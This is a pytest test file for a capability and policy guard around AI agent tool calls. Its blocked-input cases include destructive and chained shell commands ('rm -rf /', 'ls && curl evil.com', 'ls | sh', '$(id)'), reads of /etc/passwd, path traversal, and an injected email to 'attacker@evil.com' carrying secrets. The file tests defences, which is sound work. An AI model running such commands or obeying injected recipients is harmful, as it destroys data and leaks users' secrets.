from __future__ import annotations

import concurrent.futures
import os
import tempfile

import pytest

from capguard import (
    AgentIdentity,
    AgentRuntime,
    Arg,
    Capability,
    CapabilityViolation,
    Effect,
    Policy,
    PolicyEngine,
    Provenance,
    Rule,
    Severity,
    ToolRegistry,
    tool_is,
)
from capguard.audit import MemorySink, verify_chain
from capguard.core import PolicyDecision


# --------------------------------------------------------------------------- #
# BLOCKER #1 — Policy.evaluate must not crash on list params, and must attenuate
# --------------------------------------------------------------------------- #
def test_evaluate_does_not_crash_on_list_params():
    reg = ToolRegistry()

    @reg.tool(capabilities=[Capability.shell_exec(timeout=30, allowlist=["ls"])])
    def t(cmd: str) -> str:
        return cmd

    agent = AgentIdentity(id="a", allowed_capabilities=[Capability.shell_exec(timeout=30, allowlist=["ls", "grep"])])
    # Previously raised TypeError (unhashable list). Now resolves cleanly.
    assert Policy().evaluate(agent=agent, tool=reg.get("t").spec) is PolicyDecision.ALLOW


def test_attenuation_subset_allows_superset_denies():
    grant = Capability.network_http(domains=["api.a.com", "api.b.com"])
    assert grant.covers(Capability.network_http(domains=["api.a.com"]))           # subset OK
    assert not grant.covers(Capability.network_http(domains=["evil.com"]))        # outside denied
    assert not grant.covers(Capability.network_http(domains=["api.a.com", "x.com"]))


def test_attenuation_timeout_and_wildcard():
    grant = Capability.shell_exec(timeout=30, allowlist=["ls"])
    assert grant.covers(Capability.shell_exec(timeout=10, allowlist=["ls"]))      # shorter timeout OK
    assert not grant.covers(Capability.shell_exec(timeout=60, allowlist=["ls"]))  # longer timeout denied
    star = Capability.shell_exec(timeout=30, allowlist=["*"])
    assert star.covers(Capability.shell_exec(timeout=30, allowlist=["anything"]))


def test_db_readonly_attenuation():
    ro = Capability.db_query(read_only=True)
    rw = Capability.db_query(read_only=False)
    assert rw.covers(ro)                     # write authority covers read
    assert rw.covers(rw)
    assert ro.covers(ro)
    assert not ro.covers(rw)                 # read-only cannot grant write


# --------------------------------------------------------------------------- #
# BLOCKER #2 — capabilities are ENFORCED, not decorative
# --------------------------------------------------------------------------- #
def _shell_runtime():
    reg = ToolRegistry()

    @reg.tool(
        capabilities=[Capability.shell_exec(timeout=5, allowlist=["ls", "echo"])],
        severity=Severity.MEDIUM,
    )
    def shell(cmd: str) -> str:
        return f"ran:{cmd}"

    agent = AgentIdentity(
        id="bot", allowed_capabilities=[Capability.shell_exec(timeout=5, allowlist=["ls", "echo"])]
    )
    return AgentRuntime(registry=reg, policy=Policy(max_auto_allow_severity=Severity.MEDIUM), default_agent=agent)


def test_disallowed_command_is_blocked():
    rt = _shell_runtime()
    assert rt.invoke_tool("shell", cmd="ls -la") == "ran:ls -la"
    with pytest.raises(CapabilityViolation):
        rt.invoke_tool("shell", cmd="rm -rf /")          # not in allow-list


def test_shell_command_chaining_is_blocked():
    rt = _shell_runtime()
    for evil in ["ls; rm -rf /", "ls && curl evil.com", "ls | sh", "ls `whoami`", "ls $(id)", "ls > /etc/passwd"]:
        with pytest.raises(CapabilityViolation):
            rt.invoke_tool("shell", cmd=evil)


def test_http_domain_enforced():
    reg = ToolRegistry()

    @reg.tool(capabilities=[Capability.network_http(domains=["api.example.com"])])
    def fetch(url: str) -> str:
        return "ok"

    agent = AgentIdentity(id="r", allowed_capabilities=[Capability.network_http(domains=["api.example.com"])])
    rt = AgentRuntime(registry=reg, default_agent=agent)
    assert rt.invoke_tool("fetch", url="https://api.example.com/x") == "ok"
    with pytest.raises(CapabilityViolation):
        rt.invoke_tool("fetch", url="https://evil.com/x")


def test_file_path_containment_enforced():
    with tempfile.TemporaryDirectory() as d:
        allowed = os.path.join(d, "logs")
        os.makedirs(allowed)
        good = os.path.join(allowed, "a.log")
        open(good, "w").write("hi")

        reg = ToolRegistry()

        @reg.tool(capabilities=[Capability.file_read(paths=[allowed + "/*"])])
        def read_file(path: str) -> str:
            return open(path).read()

        agent = AgentIdentity(id="f", allowed_capabilities=[Capability.file_read(paths=[allowed + "/*"])])
        rt = AgentRuntime(registry=reg, default_agent=agent)
        assert rt.invoke_tool("read_file", path=good) == "hi"
        with pytest.raises(CapabilityViolation):
            rt.invoke_tool("read_file", path="/etc/passwd")
        with pytest.raises(CapabilityViolation):
            rt.invoke_tool("read_file", path=os.path.join(allowed, "..", "escape"))  # traversal


# --------------------------------------------------------------------------- #
# Capability gate: missing capability is denied
# --------------------------------------------------------------------------- #
def test_missing_capability_denied():
    reg = ToolRegistry()

    @reg.tool(capabilities=[Capability.file_write(paths=["/tmp/*"])])
    def w(path: str, content: str) -> None:
        return None

    agent = AgentIdentity(id="x", allowed_capabilities=[])  # holds nothing
    rt = AgentRuntime(registry=reg, default_agent=agent)
    with pytest.raises(PermissionError):
        rt.invoke_tool("w", path="/tmp/a", content="x")


# --------------------------------------------------------------------------- #
# Policy DSL — argument-level / use-case restriction (Progent-style)
# --------------------------------------------------------------------------- #
def _transfer_runtime(engine: PolicyEngine, handler=None):
    reg = ToolRegistry()

    @reg.tool(capabilities=[Capability.custom("transfer")], severity=Severity.LOW)
    def transfer(amount: int, recipient: str) -> str:
        return f"sent {amount} to {recipient}"

    agent = AgentIdentity(id="fin", roles=["broker"], allowed_capabilities=[Capability.custom("transfer")])
    return AgentRuntime(registry=reg, engine=engine, default_agent=agent, approval_handler=handler)


def test_dsl_argument_threshold():
    engine = PolicyEngine().add(
        Rule(name="big-transfers", trigger=tool_is("transfer"), when=Arg("amount") > 1000,
             effect=Effect.DENY, reason="amount exceeds limit")
    )
    rt = _transfer_runtime(engine)
    assert rt.invoke_tool("transfer", amount=500, recipient="bob") == "sent 500 to bob"
    with pytest.raises(PermissionError):
        rt.invoke_tool("transfer", amount=5000, recipient="bob")


def test_dsl_requires_approval_for_use_case():
    seen = {}

    def handler(event, tool):
        seen["asked"] = True
        return False  # human rejects

    engine = PolicyEngine().add(
        Rule(name="unknown-recipient", trigger=tool_is("transfer"),
             when=Arg("recipient").in_(["alice", "bob"]), effect=Effect.ALLOW)
    ).add(
        Rule(name="approve-others", trigger=tool_is("transfer"),
             when=Arg("recipient").matches("*"), effect=Effect.REQUIRE_APPROVAL,
             reason="recipient not in trusted list")
    )
    rt = _transfer_runtime(engine, handler=handler)
    with pytest.raises(PermissionError):
        rt.invoke_tool("transfer", amount=10, recipient="stranger")
    assert seen.get("asked") is True


def test_dsl_rate_limit_escalates_to_deny():
    engine = PolicyEngine().add(
        Rule(name="rl", trigger=tool_is("transfer"), effect=Effect.RATE_LIMIT, max_calls=2, per_seconds=60)
    )
    rt = _transfer_runtime(engine)
    assert rt.invoke_tool("transfer", amount=1, recipient="a")
    assert rt.invoke_tool("transfer", amount=1, recipient="a")
    with pytest.raises(PermissionError):
        rt.invoke_tool("transfer", amount=1, recipient="a")  # 3rd call over budget


# --------------------------------------------------------------------------- #
# Provenance — CaMeL-style: block untrusted data flowing into a sink
# --------------------------------------------------------------------------- #
def test_provenance_blocks_untrusted_recipient():
    engine = PolicyEngine().add(
        Rule(name="trusted-recipient-only", trigger=tool_is("send_email"),
             when=(Provenance("to") != "trusted"), effect=Effect.DENY,
             reason="recipient derived from untrusted source")
    )
    reg = ToolRegistry()

    @reg.tool(capabilities=[Capability.custom("email")], severity=Severity.LOW)
    def send_email(to: str, body: str) -> str:
        return "sent"

    agent = AgentIdentity(id="mail", allowed_capabilities=[Capability.custom("email")])
    rt = AgentRuntime(registry=reg, engine=engine, default_agent=agent)

    # recipient came from the trusted user prompt -> allowed
    assert rt.invoke_tool("send_email", to="boss@corp.com", body="hi",
                          provenance={"to": "trusted"}) == "sent"
    # recipient was extracted from an untrusted web page (injection) -> blocked
    with pytest.raises(PermissionError):
        rt.invoke_tool("send_email", to="attacker@evil.com", body="secrets",
                       provenance={"to": "untrusted_web"})


# --------------------------------------------------------------------------- #
# BLOCKER #4 — concurrency safety (no identity bleed across threads)
# --------------------------------------------------------------------------- #
def test_concurrent_calls_isolate_identity():
    reg = ToolRegistry()

    # Tool declares it uses network_http but leaves the scope to the caller's
    # grant (domains=[]). The agent's capability is what gets enforced at call
    # time — so each concurrent call is bounded by its own identity.
    @reg.tool(capabilities=[Capability.network_http(domains=[])], severity=Severity.LOW)
    def fetch(url: str) -> str:
        return url

    rt = AgentRuntime(registry=reg)
    # Two agents with disjoint domain grants, called concurrently.
    a = AgentIdentity(id="A", allowed_capabilities=[Capability.network_http(domains=["a.com"])])
    b = AgentIdentity(id="B", allowed_capabilities=[Capability.network_http(domains=["b.com"])])

    def call_a():
        return rt.invoke_tool("fetch", agent=a, url="https://a.com/x")

    def call_b():
        # B may not reach a.com; must raise regardless of interleaving with A
        try:
            rt.invoke_tool("fetch", agent=b, url="https://a.com/x")
            return "LEAK"
        except CapabilityViolation:
            return "blocked"

    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        results = list(ex.map(lambda f: f(), [call_a, call_b] * 50))
    assert "LEAK" not in results


# --------------------------------------------------------------------------- #
# BLOCKER #6 — tamper-evident audit
# --------------------------------------------------------------------------- #
def test_audit_hash_chain_detects_tampering():
    sink = MemorySink()
    rt = _shell_runtime()
    rt._audit_sink = sink
    rt.invoke_tool("shell", cmd="ls")
    rt.invoke_tool("shell", cmd="echo hi")
    assert verify_chain(sink.events) is True
    # tamper: flip a recorded param after the fact
    sink.events[0].params = {"cmd": "deadbeef"}
    assert verify_chain(sink.events) is False
